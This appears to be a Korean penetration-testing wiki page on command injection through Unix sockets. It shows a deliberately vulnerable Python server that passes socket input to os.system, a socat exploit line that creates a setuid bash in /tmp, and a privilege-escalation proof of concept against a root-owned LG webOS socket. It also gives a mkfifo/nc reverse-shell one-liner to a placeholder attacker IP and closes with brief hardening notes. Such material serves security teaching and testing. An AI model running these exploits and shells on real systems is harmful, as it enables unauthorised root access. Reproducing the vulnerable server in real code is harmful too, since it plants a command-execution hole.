# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Python을 사용한 Socket binding 예제

다음 예제에서는 **unix socket이 생성되고** (`/tmp/socket_test.s`), **수신된 모든 내용**이 `os.system`에 의해 **실행됩니다**.실제 환경에서 이런 코드를 발견할 가능성은 낮지만, 이 예제의 목적은 unix socket을 사용하는 코드가 어떤 형태인지, 그리고 최악의 경우를 가정해 입력을 어떻게 처리해야 하는지 확인하는 것입니다.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Python을 사용해** 코드를 실행하세요: `python s.py` 그리고 **소켓이 어떻게 listening 중인지 확인하세요**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## 사례 연구: Root-owned UNIX socket 기반 signal-triggered escalation (LG webOS)

일부 privileged daemon은 신뢰할 수 없는 입력을 수락하고 privileged action을 thread-ID 및 signal과 연결하는 root-owned UNIX socket을 노출합니다. protocol이 unprivileged client로 하여금 어떤 native thread를 대상으로 할지 제어하도록 허용한다면, privileged code path를 trigger하여 권한을 상승시킬 수 있습니다.

관찰된 패턴:
- root-owned socket(예: /tmp/remotelogger)에 연결합니다.
- thread를 생성하고 native thread id(TID)를 가져옵니다.
- padding과 함께 TID를 packed 형식으로 request로 전송하고 acknowledgement를 받습니다.
- 해당 TID에 특정 signal을 전달하여 privileged behaviour를 trigger합니다.

Minimal PoC 개요:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
이를 root shell로 전환하려면 간단한 named-pipe + nc 패턴을 사용할 수 있습니다:
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
참고:
- 이 유형의 bug는 권한이 없는 client state(TIDs)에서 파생된 값을 신뢰하고, 이를 권한 있는 signal handler 또는 logic에 연결할 때 발생합니다.
- socket에서 credentials를 강제하고, message format을 검증하며, 권한 있는 작업을 외부에서 제공된 thread identifier와 분리하여 harden합니다.

## 참고 자료

- [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
